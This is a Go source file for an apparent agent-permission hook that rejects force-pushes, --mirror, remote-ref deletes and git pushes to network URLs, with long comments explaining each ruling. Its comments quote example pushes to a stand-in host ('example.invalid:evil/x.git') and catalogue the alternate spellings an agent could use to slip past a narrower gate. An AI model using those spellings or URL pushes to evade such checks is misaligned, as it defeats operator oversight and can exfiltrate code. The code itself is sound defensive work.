// that `o` is the option's VALUE, not more flag letters, so scanning it would let
// a value that happens to contain `f` or `d` (`-oconfidential`) manufacture a
// false force/delete Reject — the same false-positive class pg2-5b901 records,
// arrived at through flag arity instead of command text. cmdparse.HasShortFlag
// documents that it knows no arity and pushes exactly this question to its
// caller.
//
// `--`, long flags and a lone `-` are returned untouched so HasShortFlag's own
// end-of-options and operand handling still applies.
func pushShortFlagTokens(args []string) []string {
	out := make([]string, len(args))
	for i, a := range args {
		if len(a) > 1 && a[0] == '-' && a[1] != '-' {
			if o := strings.IndexByte(a, 'o'); o > 0 {
				a = a[:o]
			}
		}
		out[i] = a
	}
	return out
}

// hasNetworkScheme reports whether tok is an explicit `<scheme>://…` URL naming a
// destination that is NOT on this filesystem.
//
// The scheme is matched GENERICALLY rather than against an allowlist, so
// `https`, `http`, `git`, `ssh` and the historical `git+ssh` / `ssh+git` forms are
// all covered, as is any scheme a future git learns — an allowlist would silently
// exempt whatever it omitted, which for a security gate is the wrong default.
//
// `file://` is the ONE exemption and it is deliberate: it names a path on this
// filesystem, so it has the local-path properties described in
// pushDestinationOffMachine, not the network ones. Matched case-insensitively
// because git accepts the scheme in any case.
func hasNetworkScheme(tok string) bool {
	i := strings.Index(tok, "://")
	if i <= 0 { // `i == 0` is "://…" with no scheme at all, not a URL
		return false
	}
	return !strings.EqualFold(tok[:i], "file")
}

// isScpLikeURL reports whether tok is git's scp-like ssh syntax,
// `[user@]host:path` — a NETWORK destination reached over ssh (measured
// 2026-07-30: `GIT_SSH_COMMAND=… git push git@example.invalid:evil/x.git main`
// invoked the ssh command, so this shape really does leave the machine).
//
// The test is git's own: a `:` that appears before any `/`. A token carrying an
// explicit `<scheme>://` is excluded first, because otherwise `file:///tmp/x`
// would match here (its first `:` precedes its first `/`) and defeat
// hasNetworkScheme's file exemption.
//
// POSITION IS LOAD-BEARING. This shape is indistinguishable from a `src:dst`
// REFSPEC (`main:other` reads as host `main`, path `other`), so it MUST be tested
// only at the DESTINATION operand position, where git itself resolves it as a
// URL. pushNetworkDestination never applies it to a later operand.
func isScpLikeURL(tok string) bool {
	if strings.Contains(tok, "://") {
		return false // an explicit scheme; hasNetworkScheme owns this token
	}
	c := strings.IndexByte(tok, ':')
	if c <= 0 {
		return false
	}
	if s := strings.IndexByte(tok, '/'); s >= 0 && s < c {
		return false // a path like /tmp/a:b — the colon is inside the path
	}
	return true
}

// pushDestinationOffMachine reports whether a `git push` DESTINATION token names
// a host other than this machine.
//
// WHAT IS DELIBERATELY NOT MATCHED — and this is the regression-critical half.
// Everything else falls through unchanged, which collapses two very different
// spellings into one ungated class ON PURPOSE:
//
//   - A configured remote NAME (`origin`, `upstream`). Ungated because gating it
//     is the whole verdict this rule already grants.
//   - A LOCAL FILESYSTEM PATH (`/tmp/dst.git`, `./dst.git`, `../dst.git`,
//     `~/dst.git`, `sub/dir`, and `file://…`). Ungated DELIBERATELY, for three
//     reasons: (1) the exfiltration rationale that makes the network form a
//     Reject does not apply — the objects never leave the filesystem; (2) whether
//     a given directory may be WRITTEN is already patheval's question, asked by
//     chdirSafe, not this rule's; (3) pushing between throwaway local repos is
//     how the evidence in this very rule was measured (pg2-bohpm's
//     --force-with-lease reproduction), so gating it would break the project's
//     own fixtures and legitimate local work.
//
// A bare name can carry neither a `://` nor a pre-slash `:`, and a local path
// carries a `/` before any `:`, so neither predicate can reach them.
func pushDestinationOffMachine(tok string) bool {
	return hasNetworkScheme(tok) || isScpLikeURL(tok)
}

// pushNetworkDestination returns the token by which a `git push` names a NETWORK
// destination, and true when it does. refspecs is pushVerdict's already-computed
// cmdparse.ClassifyPushRefspecs(rest), i.e. every operand AFTER the destination.
//
// It reads three places, because git accepts the destination in three:
//
//  1. The DESTINATION OPERAND (`git push <url> main`) — cmdparse.FirstOperand,
//     which for `git push` is the repository, not a refspec. Both shapes are
//     tested here, the only position where scp-like is unambiguous.
//  2. `--repo=<url>`, which git documents as equivalent to the operand. Only the
//     GLUED value needs its own read: in the SEPARATED form (`--repo <url>`) the
//     value is already what FirstOperand returns, by the separated-value shift
//     that primitive documents — so case 1 catches it.
//  3. Any LATER operand carrying `://`. This exists to close that same shift in
//     the other direction: `git push -o ci.skip <url> main` makes FirstOperand
//     answer `ci.skip`, moving the URL into refspec position. Only the `://` test
//     is applied here, never scp-like, because a refspec legitimately looks
//     scp-like (`main:other`) whereas `://` is not a valid ref name in any
//     position.
func pushNetworkDestination(rest []string, refspecs []cmdparse.Refspec) (string, bool) {
	if dest, _ := cmdparse.FirstOperand(rest); dest != "" && pushDestinationOffMachine(dest) {
		return dest, true
	}
	if v, ok := hasAbbrevLongFlag(rest, "repo", minAbbrevRepo); ok && v != "" && pushDestinationOffMachine(v) {
		return v, true
	}
	for _, rs := range refspecs {
		if hasNetworkScheme(rs.Raw) {
			return rs.Raw, true
		}
	}
	return "", false
}

// pushVerdict returns the verdict for a `git push` — rest being the args AFTER
// the `push` subcommand — and false when the push is none of the prohibited
// shapes, in which case classify lets it fall through to the ordinary modifying
// Approve.
//
// WHY REJECT AND NOT ASK. Operator ruling, 2026-07-30: an agent must never
// force-push. Until pg2-bohpm the rule matched `--force`/`-f` by exact token
// equality, so every other spelling of the SAME operation reached
// modifyingSubcommands["push"] and was approved outright — measured `allow` for
// `git push origin +main`, `git push origin :main`, `git push
// --force-with-lease=other origin main:other` and `git push -fu origin main`.
// Ask cannot implement that ruling: it asks a person a question the ruling has
// already answered, and an Ask on the two visible spellings beside four silent
// approvals teaches its own bypass — the agent is told "--force is prohibited"
// and retries with `+main`. Reject hands the reason back to the agent and leaves
// no approvable spelling of the operation.
//
// WHAT WOULD JUSTIFY CHANGING IT: a new operator ruling. Needing one force push
// is not one — publishing is operator-authorized anyway, so the operator can run
// it themselves; relaxing any of these to Ask requires the ruling to change.
//
// A NETWORK DESTINATION IS ALSO REJECT (pg2-abb65, 2026-07-30). `git push` takes
// a URL in place of a remote NAME, so before this gate `git push
// https://example.invalid/x.git main` measured `allow`: an agent could send any
// branch to any host, with no prompt, WITHOUT mutating `git remote` at all.
//
// REJECT RATHER THAN ASK, and the deciding argument is RELATIVE STRINGENCY, not
// severity in the abstract. `git remote set-url` / `git remote add` are gated for
// exactly this exfiltration rationale — a remote mutation silently redirects
// where pushes land. Push-to-URL is the SAME vector with strictly fewer steps and
// no persistent trace. An Ask here would therefore sit BELOW the control it is
// meant to match: an agent refused the config mutation would simply push straight
// to the URL and meet a prompt instead of a refusal, which closes the slow door
// and leaves the fast one ajar. That inversion is the whole defect, so the gate
// has to be at least as strict as the control it mirrors. Reject also leaves no
// approvable spelling, which is the property that stops the "try the next
// spelling" loop the force-push Rejects above were written to stop.
//
// THE COST OF REJECT IS NEAR ZERO HERE, which is what makes it proportionate: an
// agent must not publish on its own initiative in the first place, so it has no
// sanctioned reason to reach an arbitrary host. The remedies are both open —
// configure a remote and push by NAME (which puts a person in the loop at the
// `git remote` gate), or hand the push to the operator.
//
// LOCAL PATHS ARE NOT GATED. See pushDestinationOffMachine for the reasoning and
// for why `file://` counts as local rather than as a URL.
//
// EVERY LONG FLAG BELOW IS MATCHED BY OPEN PREFIX (pg2-os1kq), not by a measured
// abbreviation minimum. The verdicts are unchanged for every spelling git actually
// accepts — re-measured on git 2.54.0, 2026-07-30, the minimums pg2-bohpm recorded
// were correct — so this is not a bug fix here but the removal of a DEPENDENCY: a
// minimum encodes git's option table at measurement time, so `--forc` is refused by
// git today only because it is ambiguous with --force-if-includes, and retiring that
// option would turn `--forc` into a live force-push this rule approved. The open
// matcher now refuses `--forc`, `--for`, `--fo` and `--f` itself. `--repo` is the one
// exception and keeps its minimum, because its VALUE is read; see hasAbbrevLongFlag.
//
// A LONGER flag never matches a shorter canonical, so `--force-with-lease` still
// reaches its own block below rather than the force Reject above, and the two gates
// keep their separate, differently-worded reasons.
//
// TEXT VS PARSED: every test here reads PARSED tokens (post-unquote
// cmdparse.ParsedCommand.Args) and the rule runs only when
// isGitExecutable(pc.Executable), so `--force` inside a commit message, a
// heredoc body or a `bd comment` body is TEXT and never matches. That is the
// pg2-5b901 failure mode this deliberately avoids; do not reintroduce a
// strings.Contains over command text.
func (r *Rule) pushVerdict(rest []string) (hookio.RuleResult, bool) {
	reject := func(reason string) (hookio.RuleResult, bool) {
		return hookio.RuleResult{Decision: hookio.Reject, Reason: reason, Module: r.Name()}, true
	}
	shorts := pushShortFlagTokens(rest)
	refspecs := cmdparse.ClassifyPushRefspecs(rest)

	// FORCE — the ruling itself. All three spellings are the same operation: the
	// `+` refspec prefix forces just that refspec, and `-f`/`--force` force every
	// one. ClassifyPushRefspecs deliberately does not reflect the flags, and
	// HasShortFlag deliberately does not match longs, so all three are asked.
	if cmdparse.HasLongFlagPrefix(rest, "force") {
		return reject("git: force-push is prohibited — an agent must never force-push (operator ruling 2026-07-30). Every spelling is refused (--force, -f, a clustered -f…, and a '+' refspec prefix), so retrying with another one will not work; use --force-with-lease on the SAME branch, or hand the push to the operator")
	}
	if cmdparse.HasShortFlag(shorts, 'f') {
		return reject("git: force-push is prohibited — -f is --force (operator ruling 2026-07-30). Every spelling is refused, including a clustered -f… such as -fu and a '+' refspec prefix; use --force-with-lease on the SAME branch, or hand the push to the operator")
	}
	for _, rs := range refspecs {
		if rs.Force {
			return reject("git: force-push is prohibited — the '+' prefix in refspec " + rs.Raw + " IS a force (operator ruling 2026-07-30). Drop the '+'; if the push then fails as non-fast-forward, rebase, or use --force-with-lease on the SAME branch")
		}
	}

	// --mirror deletes every remote ref that is absent locally, so it is a
	// remote-ref delete of unbounded width — strictly broader than the
	// single-branch delete below, and never a legitimate agent operation here.
	if cmdparse.HasLongFlagPrefix(rest, "mirror") {
		return reject("git: git push --mirror is prohibited — it DELETES every remote ref absent locally, an unbounded remote-ref deletion (pg2-bohpm, 2026-07-30). Push the one ref you mean by name")
	}

	// REMOTE-REF DELETE. Not force-push, so outside the literal ruling, but it
	// destroys a remote ref, which for another clone may be the only copy, and
	// nothing an agent can do restores it. Rejected for the same reason the flag
	// spellings are: pinning only the `:main` refspec form and leaving `--delete`
	// open would teach the flag form as the bypass. Both are the same operation.
	// Revisiting this needs an operator ruling on remote-ref deletion, not a
	// workflow that finds it inconvenient — deleting a merged remote branch is
	// the platform's job (GitHub does it on merge), not a push's.
	if cmdparse.HasLongFlagPrefix(rest, "delete") {
		return reject("git: deleting a remote ref is prohibited — --delete destroys a ref that may be another clone's only copy (pg2-bohpm, 2026-07-30). Every spelling is refused (--delete, -d, and a ':ref' refspec); let the platform delete a merged branch, or hand it to the operator")
	}
	if cmdparse.HasShortFlag(shorts, 'd') {
		return reject("git: deleting a remote ref is prohibited — -d is --delete (pg2-bohpm, 2026-07-30). Every spelling is refused; let the platform delete a merged branch, or hand it to the operator")
	}
	for _, rs := range refspecs {
		if rs.Delete {
			return reject("git: deleting a remote ref is prohibited — the empty source in refspec " + rs.Raw + " IS a delete (pg2-bohpm, 2026-07-30). Every spelling is refused; let the platform delete a merged branch, or hand it to the operator")
		}
	}

	// NETWORK DESTINATION (pg2-abb65). See this function's doc comment for the
	// Reject-not-Ask ruling and pushDestinationOffMachine for what counts.
	//
	// ORDER IS LOAD-BEARING, IN BOTH DIRECTIONS.
	//
	// AFTER the force / --mirror / --delete Rejects above: those are prohibited
	// OPERATIONS whatever the destination, and their reasons name the operation and
	// its remedy. Reaching them first leaves every pg2-bohpm verdict and reason
	// string byte-identical, so a `--force` to a URL still reads as a force-push
	// refusal — the accurate answer, since dropping the URL would not make it
	// approvable.
	//
	// BEFORE the --force-with-lease block below, which is not optional. That block
	// returns an ASK for a same-branch lease to any remote that is not `origin`,
	// and a URL is by definition not `origin` — so placed after it, this gate would
	// be SHADOWED for every `--force-with-lease <url> main` and the URL form would
	// silently DOWNGRADE from Reject to Ask (measured on the pre-fix binary: `git
	// push --force-with-lease https://example.invalid/x.git main` answered `ask`
	// from that very branch). Ordering it first makes the two gates disjoint in
	// practice: the non-origin Ask now only ever sees a NAMED remote, which is what
	// it was written for.
	if dest, ok := pushNetworkDestination(rest, refspecs); ok {
		return reject("git: pushing to a URL is prohibited — " + dest + " is a network destination, not a configured remote, so this sends repository contents to an arbitrary host with no `git remote` change to show for it (pg2-abb65, 2026-07-30). It is refused for the same exfiltration reason `git remote set-url` is, and refused rather than prompted so it is not the cheaper way around that gate. Push to a configured remote by NAME, or hand the push to the operator")
	}

	// --force-with-lease: CROSS-BRANCH is Reject, SAME-BRANCH stays approvable.
	//
	// Cross-branch is a Reject on measured evidence (2026-07-30): pushing `main`
	// onto a divergent `other` with a FRESH lease exited 0 with `+ d3167d6...3cdea6c
	// main -> other (forced update)` and DESTROYED the unique commit on `other`.
	// The lease only pins the ref it NAMED, so it gives zero protection against
	// naming the wrong branch — the safety property the same-branch idiom relies on
	// is simply absent here, which is why this half cannot stay an Ask while the
	// force spellings above are Rejects.
	//
	// Same-branch --force-with-lease is the correct post-rebase idiom and is in
	// daily use, so it MUST fall through to Approve.
	//
	// SEMANTIC TRAP: in `--force-with-lease=<refname>:<expect>` the colon separates
	// the ref from the EXPECTED OBJECT ID, not local from remote. So
	// `--force-with-lease=main:abc123 origin main` is a SAME-branch push carrying an
	// explicit lease — the safest form there is. The lease VALUE is therefore
	// deliberately NOT read here; cross-branch-ness comes only from the push
	// REFSPEC OPERANDS (`main:other`), which is what ClassifyPushRefspecs returns.
	if cmdparse.HasLongFlagPrefix(rest, "force-with-lease") {
		for _, rs := range refspecs {
			// SameRef treats `HEAD:main` as cross-branch: HEAD cannot be resolved
			// from a token, and for a gate the safe reading is cross-branch. Name the
			// branch (`main`, or `main:main`) to get the same-branch verdict.
			if !rs.SameRef() {
				return reject("git: --force-with-lease onto a DIFFERENT remote branch is prohibited — refspec " + rs.Raw + " pushes to another ref, and the lease protects only the ref it NAMES (measured 2026-07-30: it force-updated the destination and destroyed its unique commit). Push to the same branch name instead")
			}
		}
		// A non-origin NAMED remote keeps the Ask it has today. The lease is
		// same-branch, so the ruling's Reject does not reach it, but nothing about
		// pg2-bohpm justifies LOOSENING an existing Ask either — this rule's changes
		// are one-directional. Since pg2-abb65 this branch no longer sees a URL
		// destination: that is Rejected above, deliberately ordered ahead of here so
		// this Ask cannot shadow it. FirstOperand's separated-value shift can still
		// put a flag VALUE here (`--force-with-lease -o x main` reads `x` as the
		// remote), which lands on the safe side — an Ask.
		if remote, _ := cmdparse.FirstOperand(rest); remote != "" && remote != "origin" {
			return hookio.RuleResult{
				Decision: hookio.Ask,
				Reason:   "git: --force-with-lease to a remote other than origin (" + remote + ")",
				Module:   r.Name(),
			}, true
		}
	}
	return hookio.RuleResult{}, false
}
